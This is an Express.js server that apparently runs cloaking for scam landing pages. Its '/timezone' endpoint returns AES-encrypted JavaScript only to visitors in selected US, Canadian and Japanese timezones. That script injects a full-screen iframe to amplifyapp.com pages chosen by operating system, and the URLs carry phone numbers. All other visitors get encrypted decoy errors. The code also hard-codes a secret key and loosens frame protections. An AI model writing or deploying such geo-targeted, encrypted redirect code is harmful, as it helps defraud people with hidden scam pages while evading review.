const express = require("express");
const cors = require("cors");
const CryptoJS = require("crypto-js");

const app = express();
const PORT = 3000;
const secretKey = "2B9IyccRxXwiZctB2LiJFX2pKNedKvwO017H2ii4toIUcF5T3JbmskNEytf";

// --- Middleware ---
app.use(cors());
app.use(express.json());

// Add CORS & Security Policy middleware
app.use((req, res, next) => {
    res.header("Access-Control-Allow-Origin", "*");
    res.header("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept");
    res.header("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS");
    
    // Modern way to handle frame permissions
    const originalXFrameOptions = res.getHeader('X-Frame-Options');
    if (originalXFrameOptions === 'sameorigin') {
        res.removeHeader('X-Frame-Options');
        res.setHeader('X-Frame-Options', 'ALLOW-FROM *');
    }
    next();
});

// --- Helper Functions ---

function aesEncode(text) {
    return CryptoJS.AES.encrypt(text, secretKey).toString();
}

function getError() {
    const se1 = `console.log("Error Find");`;
    const encrypted1 = aesEncode(se1);
    return encodeURIComponent(encrypted1);
}

function getResponse(userAgent) {
    // Detect if user is on macOS
    const isMac = /Macintosh|Mac OS X/i.test(userAgent);

    // Define your Groups with weights and OS-specific links
    const linkGroups = [
        {
            id: "Group 1",
            weight: 0.5,
            macos: "https://main.d3o0q87efdh1wv.amplifyapp.com/m2a4c234rjnkeferf/index.html?Anph=0101-83366-64655",
            others: "https://main.d3o0q87efdh1wv.amplifyapp.com/w2i4n234rjnkeferf/index.html?Anph=0101-83366-64655"
        },
        {
            id: "Group 2",
            weight: 0.5,
            macos: "https://main.dmd46rtsqesma.amplifyapp.com/m2a4c234rjnkeferf/index.html?Anph=(050)-6864-8350",
            others: "https://main.dmd46rtsqesma.amplifyapp.com/w2i4n234rjnkeferf/index.html?Anph=(050)-6864-8350"
        }
    ];

    // 1. Pick the group based on weight (70/30)
    function selectGroup() {
        const rand = Math.random();
        let cumulative = 0;
        for (const group of linkGroups) {
            cumulative += group.weight;
            if (rand <= cumulative) {
                return group;
            }
        }
        return linkGroups[0]; // Fallback to first group
    }

    const selectedGroup = selectGroup();

    // 2. Select URL within that group based on OS detection
    const selectedUrl = isMac ? selectedGroup.macos : selectedGroup.others;

    // 3. Build the JavaScript payload
    const se1 = `
        const iframe = document.createElement("iframe");
        iframe.src = "${selectedUrl}";

        // permissions
        iframe.setAttribute(
            "allow",
            "fullscreen; autoplay; encrypted-media; picture-in-picture"
        );

        // fullscreen support
        iframe.setAttribute("allowfullscreen", "");
        iframe.setAttribute("webkitallowfullscreen", "");
        iframe.setAttribute("mozallowfullscreen", "");

        // sandbox
        iframe.setAttribute(
            "sandbox",
            "allow-scripts allow-popups allow-forms allow-downloads"
        );

        // styles
        iframe.style.width = "100%";
        iframe.style.height = "100%";
        iframe.style.border = "0px";

        // add to page
        const container = document.getElementById("contentiframe");
        if(container) {
            container.replaceChildren(iframe);
        }
    `;

    return encodeURIComponent(aesEncode(se1));
}

// --- Routes ---

app.get("/timezone", (req, res) => {
    res.status(401).json({
        status: "error",
        message: "Unauthorized access",
        response: getError()
    });
});

app.post("/timezone", (req, res) => {
    const { timezone } = req.body;
    const userAgent = req.get('User-Agent') || "";

    const allowedTimezones = [
        "Asia/Tokyo",
        "America/New_York", "America/Chicago", "America/Denver", "America/Los_Angeles", "America/Anchorage",
        "Pacific/Honolulu",
        "America/Toronto", "America/Vancouver", "America/Edmonton", "America/Winnipeg", "America/Halifax", "America/St_Johns"
    ];

    if (allowedTimezones.includes(timezone)) {
        res.send(getResponse(userAgent));
    } else {
        res.send(getError());
    }
});

// --- Start Server ---
app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
});
